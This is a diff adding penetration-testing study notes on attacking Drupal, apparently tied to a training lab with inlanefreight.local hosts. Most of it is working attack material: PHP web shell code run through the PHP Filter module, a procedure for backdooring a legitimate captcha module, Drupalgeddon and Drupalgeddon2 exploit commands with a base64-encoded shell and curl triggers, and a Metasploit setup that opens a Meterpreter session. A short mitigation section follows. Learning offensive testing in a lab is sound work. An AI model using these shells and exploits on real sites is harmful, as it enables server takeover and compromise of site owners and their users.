@@ -698,3 +698,213 @@ droopescan scan drupal -u http://drupal.inlanefreight.local
 
 ---
 
+# 🛡️ Attacking Drupal
+
+## 📌 Overview of Attacking Drupal
+
+* **Goal**: Gain shell access or remote code execution (RCE) on a Drupal instance.
+* **CMS Target**: Drupal – often more hardened than some CMS platforms (e.g., WordPress).
+* **Initial Step**: Identify Drupal and fingerprint the version.
+
+## 🧩 PHP Filter Module Exploitation
+
+### 🟡 Drupal < 8
+
+1. **Enable PHP Filter Module**:
+
+   * Navigate: `Admin > Extend`
+   * Enable: `PHP filter`
+2. **Create a New Page**:
+
+   * Navigate: `Content > Add content > Basic Page`
+   * Insert:
+
+     ```php
+     <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
+     ```
+   * Set Text Format: `PHP code`
+3. **Access Shell**:
+
+   * Example URL:
+     `http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`
+   * Command-line usage:
+
+     ```bash
+     curl -s http://<target> | grep uid
+     ```
+
+### 🔵 Drupal ≥ 8
+
+* **PHP Filter is not installed by default**
+* Steps:
+
+  1. Download:
+
+     ```bash
+     wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+     ```
+  2. Install via Admin Interface: `Admin > Extend > Install new module`
+  3. Proceed with the same page creation and shell insertion as in version 7
+
+⚠️ **Warning**: Always inform the client and **remove module/pages** after testing.
+
+
+## 🎯 Uploading a Backdoored Module
+
+1. **Download Legit Module**:
+
+   ```bash
+   wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+   tar xvf captcha-8.x-1.2.tar.gz
+   ```
+
+2. **Add Web Shell**:
+   `shell.php`:
+
+   ```php
+   <?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
+   ```
+
+   `.htaccess`:
+
+   ```apache
+   <IfModule mod_rewrite.c>
+   RewriteEngine On
+   RewriteBase /
+   </IfModule>
+   ```
+
+3. **Repackage Module**:
+
+   ```bash
+   mv shell.php .htaccess captcha/
+   tar cvf captcha.tar.gz captcha/
+   ```
+
+4. **Upload & Trigger**:
+
+   * Install via: `Admin > Extend > Install new module`
+   * Trigger:
+
+     ```bash
+     curl http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+     ```
+
+## 🧨 Drupalgeddon Exploits
+
+### 1. **Drupalgeddon (CVE-2014-3704)**
+
+* **Type**: Pre-auth SQL Injection → Add admin user
+* **Affected**: Drupal 7.0–7.31
+* **Fix**: 7.32
+* **Exploit Usage**:
+
+  ```bash
+  python2.7 drupalgeddon.py -t http://target -u hacker -p pwnd
+  ```
+* **Outcome**: Creates admin user, then login and execute previous PHP Filter RCE methods.
+
+### 2. **Drupalgeddon2 (CVE-2018-7600)**
+
+* **Type**: **Unauthenticated Remote Code Execution (RCE)**
+* **Affected Versions**:
+
+  * Drupal 7.x < 7.58
+  * Drupal 8.x < 8.3.9, < 8.4.6, < 8.5.1
+
+#### 🧪 Exploitation Process
+
+1. **Check if Vulnerable**:
+
+   * Run:
+
+     ```bash
+     python3 drupalgeddon2.py
+     ```
+
+   * Input target:
+     `http://drupal-dev.inlanefreight.local/`
+
+   * Validate with:
+
+     ```bash
+     curl -s http://drupal-dev.inlanefreight.local/hello.txt
+     ```
+
+2. **Create Base64-Encoded Web Shell**:
+
+   ```bash
+   echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' | base64
+   ```
+
+   Result:
+
+   ```
+   PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
+   ```
+
+3. **Inject Shell via Modified Script**:
+
+   * Write decoded shell:
+
+     ```bash
+     echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+     ```
+   * Rerun exploit to upload this shell file.
+
+4. **Trigger the Shell**:
+
+   ```bash
+   curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+   ```
+
+   Output:
+
+   ```
+   uid=33(www-data) gid=33(www-data) groups=33(www-data)
+   ```
+
+#### 🧯 Detection & Mitigation
+
+* **Update Drupal** immediately to:
+
+  * 7.58+
+  * 8.3.9 / 8.4.6 / 8.5.1+
+* Monitor logs for:
+
+  * `/user/register` requests with suspicious `#` parameters
+  * Unexpected files like `hello.txt`, `mrb3n.php`
+* Use a **WAF** to block injection attempts.
+
+### 3. **Drupalgeddon3 (CVE-2018-7602)**
+
+* **Type**: Authenticated RCE (node deletion permission required)
+* **Affected**: Drupal 7.x and 8.x
+* **Exploit**: Form API misuse
+* **Tool**: Metasploit
+
+#### 🔧 Exploitation Steps
+
+1. **Login to Drupal Admin**
+2. **Get Session Cookie**
+3. **Set up Metasploit Module**:
+
+   ```bash
+   use exploit/multi/http/drupal_drupageddon3
+   set RHOSTS <target_ip>
+   set VHOST drupal-acc.inlanefreight.local
+   set DRUPAL_SESSION SESS<session_cookie>
+   set DRUPAL_NODE 1
+   set LHOST <your_ip>
+   exploit
+   ```
+4. **Meterpreter Session Confirmed**:
+
+   ```bash
+   meterpreter > getuid
+   meterpreter > sysinfo
+   ```
+
+---
+
+
